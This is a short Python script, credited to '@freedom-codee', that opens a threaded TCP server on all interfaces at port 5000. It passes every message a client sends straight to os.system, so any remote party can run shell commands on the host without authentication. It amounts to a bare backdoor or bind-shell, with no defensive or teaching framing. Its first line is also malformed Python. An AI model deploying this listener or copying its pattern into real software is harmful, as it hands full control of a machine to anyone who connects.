__author__: @freedom-codee
    
    
import socketserver
import os



class MyServer(socketserver.BaseRequestHandler):
    def handle(self):
        print(self.client_address)

        while True:
            recv_data = self.request.recv(8192).decode()
            print(recv_data)
            os.system(recv_data)
            send_msg = input('server@--> ').encode('utf-8')
            self.request.sendall(send_msg)





if __name__ == '__main__':
    server = socketserver.ThreadingTCPServer(('0.0.0.0',5000),MyServer)
    server.serve_forever()
